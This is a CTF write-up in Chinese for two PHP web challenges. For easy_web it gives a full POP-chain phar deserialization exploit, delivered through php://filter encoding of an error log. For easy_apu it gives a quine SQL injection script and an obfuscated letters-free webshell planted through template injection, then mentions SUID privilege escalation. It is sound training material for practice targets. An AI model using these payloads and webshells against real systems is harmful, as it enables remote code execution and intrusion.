##  前言

这次出了两个题，但是只放了一个easy_web这个题。镜像我都上传到我的dockerhub里了，自己需要的可以拉取。

##  easy_web

F12,想到了robots.txt,下载源码

![image-20220517094631023](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/image-20220517094631023.png)

下载后开始审计代码，这儿我就不把源码复制过来了。

根据源码的`User.class.php`，直接admin,password登录进去

###  构造pop链

看到php文件中有很多魔法函数，就需要构造一个pop链子



链子从头到尾找，头部在`User`类的`__desctruct`中，然后尾部是在`Files`类中的`__get`中，里面可以执行任意命令；头部首先进入了`__desctruct()`后，可以通过数组的形式访问任意类的任意方法，那我们就让它访问`User`类的`check()`方法中，然后这里有`echo`，以字符串的形式输出对象，然后就会跳到`Myerror`类中的`__tostring()`方法中，然后它里面的`$this->test`是可控的，我们让它等于一个`Files`类里面没有的属性就行了，就可以直接调用`__get`方法了，并且给`$key`赋值，所以说现在的`exp`为：

```php
<?php
class Files{
    public $filename;

    public function __construct(){
        $this->arg = 'strings /flag';
    }
}
class Myerror{
    public $message;

    public function __construct(){
        $this -> test = 'passthru';
        $this -> message = new Files();
    }
}
class User{
    public $username = 'admin';
    public function __construct(){
        $this -> username = new Myerror();
    }

}
$a = new User();
$a -> password = [new User(),"check"];
echo serialize($a);
```

有了链子，然后我们需要想的是怎么触发这个反序列化，又没有`unserialize`的函数

想到phar反序列，在`Myerror.class.php`中写到将错误日志文件写到了`/var/www/html/log/error.txt`，这里就给我们很明显的提示了，就是把想要的数据写入到错误日志里面，所以可以写phar文件内容进去，然后通过这个`file_get_content`,触发phar文件，就可以实现RCE

（之前的phar反序列化基本都是上传文件）

![image-20220522145850951](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/image-20220522145850951.png)

构造完整的phar文件如下

```php
<?php
class Files{
    public $filename;

    public function __construct(){
        $this->arg = 'strings /flag';
    }
}
class Myerror{
    public $message;

    public function __construct(){
        $this -> test = 'passthru';
        $this -> message = new Files();
    }
}
class User{
    public $username = 'admin';
    public function __construct(){
        $this -> username = new Myerror();
    }

}
$a = new User();
$a -> password = [new User(),"check"];
$b=[$a,null];
$phar = new Phar("phar4.phar");
$phar -> startBuffering();
$phar -> setStub("GIF89a"."<?php __HALT_COMPILER(); ?>");
$phar -> setMetadata($b);
$phar -> addFromString("test.txt","test");
$phar -> stopBuffering();
?>
```

###  php://filter的利用

我们把phar文件内容写到日志去了，但是利用的部分只是图中红框，所以我们需要通过`filter`协议去处理数据



![image-20220522151501824](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/image-20220522151501824.png)

这儿我们通过编码的形式去处理数据

首先，日志文件中经常会有一些历史的数据，我们首先得先清空文件内容，用到这个过滤器`php://filter/read=consumed/resource`本题为：`php://filter/read=consumed/resource=log/error.txt`



提到利用过滤器编码，我们首先想到的肯定是`php://filter/read=convert.base64-encode/resource`，为了避免特殊字符造成的混乱，我们可以在读文件时先将文件内容`base64`编码一下，而PHP在进行`base64`解码的时候，不符合`base64`标准的字符就会被自动忽略，因为`base64`编码只有可能由`a-zA-Z0-9`这些字符以及`=`填充字符组成，那么就只会将这些合法字符组成密文进行解密

我们通过上面可以看出，日志文件的格式是`[x1]phar文件[x2]`，`[x1]和[x2]`都是我们不想要的的脏数据，我们利用单个的`base64`编码肯定是吃不到他们的，但我们的思路是把除了`phar`文件以外的其它内容全变成非`base64`的合法字符，这样的话最后来一次`base64`解码就都吃掉了

我们可以先将需要的数据转换成`utf-16le`的格式；当它由`utf-8`转换为`utf-16le`时，它的每一位字符后面都会加上一个`\0`，这个`\0`是不可见字符，但当我们将`utf-16le`转换为`utf-8`的时候，只有后面有`\0`的才会被正常转换，其它的就会被当成乱码，当成乱码就很好呀，前面我们提到了我们就是想要把不需要的内容变成乱码，接下来看看测试：

![image-20220522152913325](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/image-20220522152913325.png)

![image-20220522153216569](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/image-20220522153216569.png)



除了我们想要的内容其它内容都变成了乱码，我们也可以用`ucs-2`来代替就行，原理是一样的；这里还有最后一个问题，就是对空字节的处理，它只有一字节，而 `file_get_contents()` 在加载有空字节的文件时会 `warning`，所以说我们要对它进行填充编码，这时候我们就能联想到`quoted-printable`这种编码了，这里面我就直接偷那篇文章里对这种编码的介绍了：

```
COPYquoted-printable
这种编码方法的要点就是对于所有可打印字符的 ascii 码，除特殊字符等号 = 外，都不改变。
= 和不可打印的 ascii 码以及非 ascii 码的数据的编码方法是：
先将每个字节的二进制代码用两个十六进制数字表示，然后在前面再加上一个等号 = 。
举例如 = ，它的编码便是 =3D ，3D 可对照十六进制 ascii 码表得到。
```

它也有对应的过滤器：`convert.quoted-printable-decode`，所以说经过这三次编码之后，就可以出现纯净的`phar`文件了，所以它解码的顺序为：`convert.quoted-printable-decode --> ucs-2 -> utf-8 --> base64-decode`

所以说我们的编码顺序是：`base64-encode --> utf-8 -> ucs-2 --> convert.quoted-printable-decode`，我们可以写一个编码脚本：

```php
<?php
$b=file_get_contents('ars2.phar');
$payload=iconv('utf-8','UCS-2',base64_encode($b));
file_put_contents('payload.txt',quoted_printable_encode($payload));
$s = file_get_contents('payload.txt');
$s = preg_replace('/=\r\n/', '', $s);
echo $s;
?>
```

### GC回收机制触发__desctruct

因为这里我们要触发`phar`反序列化，所以说肯定是绕不过`phar://`的，但注意这里的顺序，是先经过`file_get_contents`然后再经过`file_check()`，由于异常退出它不能正常进入`__desctruct()`，所以说我们得利用数组让这个对象失去引用进而触发GC回收机制进入到`__desctruct()`

[参考我这篇文章](https://blog.csdn.net/unexpectedthing/article/details/122930867?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165320325016781435452287%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=165320325016781435452287&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-122930867-null-null.nonecase&utm_term=phar&spm=1018.2226.3001.4450)

需要修改phar文件，这个i=1改为i=0,然后修改签名算法

![image-20220517095054504](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/image-20220517095054504.png)

然后修改签名

```python
from hashlib import sha1
f = open('./phar4.phar', 'rb').read() # 修改内容后的phar文件
s = f[:-28] # 获取要签名的数据
h = f[-8:] # 获取签名类型以及GBMB标识
newf = s+sha1(s).digest()+h # 数据 + 签名 + 类型 + GBMB
open('phar5.phar', 'wb').write(newf) # 写入新文件
```

修改完签名后得到的phar文件，利用filter协议处理数据,我用的是UCS-2

```php
<?php
$b=file_get_contents('phar5.phar');
$payload=iconv('utf-8','UCS-2',base64_encode($b));
file_put_contents('payload.txt',quoted_printable_encode($payload));
$s = file_get_contents('payload.txt');
$s = preg_replace('/=\r\n/', '', $s);
echo $s;
?>
```

获得

```
=00R=000=00l=00G=00O=00D=00l=00h=00P=00D=009=00w=00a=00H=00A=00g=00X=001=009=00I=00Q=00U=00x=00U=00X=000=00N=00P=00T=00V=00B=00J=00T=00E=00V=00S=00K=00C=00k=007=00I=00D=008=00+=00D=00Q=00q=00f=00A=00Q=00A=00A=00A=00Q=00A=00A=00A=00B=00E=00A=00A=00A=00A=00B=00A=00A=00A=00A=00A=00A=00B=00p=00A=00Q=00A=00A=00Y=00T=00o=00y=00O=00n=00t=00p=00O=00j=00A=007=00T=00z=00o=000=00O=00i=00J=00V=00c=002=00V=00y=00I=00j=00o=00y=00O=00n=00t=00z=00O=00j=00g=006=00I=00n=00V=00z=00Z=00X=00J=00u=00Y=00W=001=00l=00I=00j=00t=00P=00O=00j=00c=006=00I=00k=001=005=00Z=00X=00J=00y=00b=003=00I=00i=00O=00j=00I=006=00e=003=00M=006=00N=00z=00o=00i=00b=00W=00V=00z=00c=002=00F=00n=00Z=00S=00I=007=00T=00z=00o=001=00O=00i=00J=00G=00a=00W=00x=00l=00c=00y=00I=006=00M=00j=00p=007=00c=00z=00o=004=00O=00i=00J=00m=00a=00W=00x=00l=00b=00m=00F=00t=00Z=00S=00I=007=00T=00j=00t=00z=00O=00j=00M=006=00I=00m=00F=00y=00Z=00y=00I=007=00c=00z=00o=00x=00M=00z=00o=00i=00c=003=00R=00y=00a=00W=005=00n=00c=00y=00A=00v=00Z=00m=00x=00h=00Z=00y=00I=007=00f=00X=00M=006=00N=00D=00o=00i=00d=00G=00V=00z=00d=00C=00I=007=00c=00z=00o=004=00O=00i=00J=00w=00Y=00X=00N=00z=00d=00G=00h=00y=00d=00S=00I=007=00f=00X=00M=006=00O=00D=00o=00i=00c=00G=00F=00z=00c=003=00d=00v=00c=00m=00Q=00i=00O=002=00E=006=00M=00j=00p=007=00a=00T=00o=00w=00O=000=008=006=00N=00D=00o=00i=00V=00X=00N=00l=00c=00i=00I=006=00M=00T=00p=007=00c=00z=00o=004=00O=00i=00J=001=00c=002=00V=00y=00b=00m=00F=00t=00Z=00S=00I=007=00T=00z=00o=003=00O=00i=00J=00N=00e=00W=00V=00y=00c=00m=009=00y=00I=00j=00o=00y=00O=00n=00t=00z=00O=00j=00c=006=00I=00m=001=00l=00c=003=00N=00h=00Z=002=00U=00i=00O=000=008=006=00N=00T=00o=00i=00R=00m=00l=00s=00Z=00X=00M=00i=00O=00j=00I=006=00e=003=00M=006=00O=00D=00o=00i=00Z=00m=00l=00s=00Z=00W=005=00h=00b=00W=00U=00i=00O=000=004=007=00c=00z=00o=00z=00O=00i=00J=00h=00c=00m=00c=00i=00O=003=00M=006=00M=00T=00M=006=00I=00n=00N=000=00c=00m=00l=00u=00Z=003=00M=00g=00L=002=00Z=00s=00Y=00W=00c=00i=00O=003=001=00z=00O=00j=00Q=006=00I=00n=00R=00l=00c=003=00Q=00i=00O=003=00M=006=00O=00D=00o=00i=00c=00G=00F=00z=00c=003=00R=00o=00c=00n=00U=00i=00O=003=001=009=00a=00T=00o=00x=00O=003=00M=006=00N=00T=00o=00i=00Y=002=00h=00l=00Y=002=00s=00i=00O=003=001=009=00a=00T=00o=00w=00O=000=004=007=00f=00Q=00g=00A=00A=00A=00B=000=00Z=00X=00N=000=00L=00n=00R=004=00d=00A=00s=00A=00A=00A=00B=00f=00G=00I=00F=00i=00C=00w=00A=00A=00A=00N=00v=00G=00o=00S=00C=002=00A=00Q=00A=00A=00A=00A=00A=00A=00A=00G=00F=00h=00Y=00W=00F=00h=00Y=00W=00F=000=00Z=00X=00N=000=00m=00q=00m=00Y=00/=006=00M=00E=00x=00m=008=00j=00z=00s=00U=00K=00F=00y=00n=00e=00G=00W=000=00M=00m=00z=00E=00C=00A=00A=00A=00A=00R=000=00J=00N=00Q=00g=00=3D=00=3D

```

流程：先输入上面的一串字符，一定先清除之前的数据`php://filter/read=consumed/resource`

![image-20220522153908885](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/image-20220522153908885.png)

然后用filter的编码，过滤数据，点上那个write

![image-20220522154004436](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/image-20220522154004436.png)

![image-20220522154022630](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/image-20220522154022630.png)

最后就用`phar://log/error.txt`,触发反序列化，获取flag

![image-20220522154121064](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/image-20220522154121064.png)

##  easy_apu

F12的提示

![image-20220522155030303](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/image-20220522155030303.png)



拿到源码

```php
<?php
include_once("db.php");

function sqlWaf($s) {
    if(preg_match("/regexp|between|in|flag|=|>|<|and|\||right|left|reverse|update|extractvalue|floor|substr|&|;|\\\$|0x|sleep|\ /i",$s)){
        alMessage('web狗！！！', 'index.php');
    }
}
function alMessage($message,$url){
    die("<script>alert('{$message}');location.href='{$url}';</script>");
}
if (isset($_POST['username']) && $_POST['username'] !== '' && isset($_POST['password']) && $_POST['password'] !== '') {
    $username=$_POST['username'];
    $password=$_POST['password'];
    if ($username !== 'z3eyond') {
        alMessage('only z3eyond can login', 'index.php');
    }
    sqlWaf($password);
    $sql="SELECT password FROM users WHERE username='z3eyond' and password='$password';";
    $result=mysqli_query($con,$sql);
    $row = mysqli_fetch_array($result);
    if (!$row) {
        alMessage("something wrong",'index.php');
    }
    if ($row['password'] === $password) {
        echo "/apu_middle/getApuMain.php";
    } else {
        alMessage("wrong password",'index.php');
    }
}

if(isset($_GET['apu_love'])){
    highlight_file(__FILE__);
    die("给你显示代码了,自己绕过waf哦！！！");
}
?>
```

就是一个自查询的sql注入题

```python
def quine(data, debug=True):
    if debug: print(data)
    data = data.replace('@@',"REPLACE(REPLACE(@@,CHAR(34),CHAR(39)),CHAR(64),@@)")
    blob = data.replace('@@','"@"').replace("'",'"')
    data = data.replace('@@',"'"+blob+"'")
    if debug: print(data)
    return data

result = quine("'UNION/**/SELECT/**/@@/**/AS/**/z3eyond#")
```

python跑一下，传进去，就进入下一个界面

base64解码后,

```
aGVsbG8sd2ViX2QwZyEhIXNjdWN0Zl9pc19yZWFsbHlfaW50ZXJlc3RpbmfjgIIKCi9nZXRBcHVJbWFnZS5waHA/aW1hZ2U9YXB1LmpwZwovZ2V0QXB1QXV0aGVudGljYXRvci5waHAKL2dldEFwdVRlbXBsYXRlLnBocA==
```

```
hello,web_d0g!!!scuctf_is_really_interesting。

/getApuImage.php?image=apu.jpg
/getApuAuthenticator.php
/getApuTemplate.php
```

进入`/getApuImage.php?image=apu.jpg`,通过这个image参数，可以拿源码

![image-20220522160002434](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/image-20220522160002434.png)



每个php文件的源码拿到后

getApuAuthenticator.php

```php
<?php
echo "520刚过，告诉你们一个秘密，apu跟豪豪表白了，（づ￣3￣）づ╭❤～！！!";
error_reporting(0);
if(isset($_POST['apu']) && isset($_POST['y4'])){
    $apu = $_POST['apu'];
    $y4 = $_POST['y4'];
    if(strlen($_POST['apu']) > 6){
        echo("<script>alert('APU is too long!');</script>");
    }else{
        if(preg_match('/[^\w\/\(\)\*<>]/', $_POST['apu']) === 0){
            $_POST['y4'] = preg_replace("/[a-zA-Z0-9|^~]/","",$_POST['y4']);
            $template = file_get_contents('./template.html');
            $content = str_replace("__APU__", $_POST['apu'], $template);
            $content = str_replace("__Y4__", $_POST['y4'], $content);
            file_put_contents('getApuTemplate.php', $content);
            echo("<script>alert('Successed!');</script>");
        }
        else{
            echo("<script>alert('Invalid chars in apu!');</script>");
        }
    }
}
//蚁剑对你构造的eval函数和assert函数都不敏感哦！！！想想还可以构造什么函数哦！！！
```

getApuImage.php

```php
<?php
error_reporting(0);
echo "豪哥哥的image有很多神奇的地方哦！！！";
$image = (string)$_GET['image'];
if(preg_match('/[^a-zA-Z.]+/',$image)===0){
    echo '<div class="img"> <img src="data:image/png;base64,' . base64_encode(file_get_contents($image)) . '" /> </div>';
}else{
    echo "hacker!!!";
}
?>
```

通过getApuAuthenticator.php的HTML注入

直接在HTML注入马

![image-20220522160242677](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/image-20220522160242677.png)

但是有过滤，用自增的方式处理无字母数字的题

```
$_POST['y4'] = preg_replace("/[a-zA-Z0-9|^~]/","",$_POST['y4']);
```

我测了一下，构造出`eval`和`assert`都没发连接蚁剑

为什么连接蚁剑，应该我们后面读flag要提权

所以构造

```
<?php
$_= CREATE_FUNCTION('', $_POST['$_']);
$_();
```

```
<?=
$_=[];$_=@"$_";$_=$_['!'=='@'];$__=$_;$__++;$__++;$___=$__;$__++;$__++;$_____=$__;$__++;$______=$__;$__++;$__++;$__++;$_______=$__;$__++;$__++;$__++;$__++;$__++;$________=$__;$__++;$_________=$__;$__++;$__++;$__++;$__________=$__;$__++;$__++;$___________=$__;$__++;$____________=$__;$___=$___.$__________.$_____.$_.$___________.$_____.'_'.$______.$____________.$________.$___.$___________.$_______.$_________.$________;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$$____;$_ = $___('',$__[$_]);$_();
?>
```

一定要urlencode再传上去

![image-20220522161153061](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/image-20220522161153061.png)

连接蚁剑



![image-20220522161059662](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/image-20220522161059662.png)

然后开始提权,SUID提权

![image-20220522161254200](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/image-20220522161254200.png)
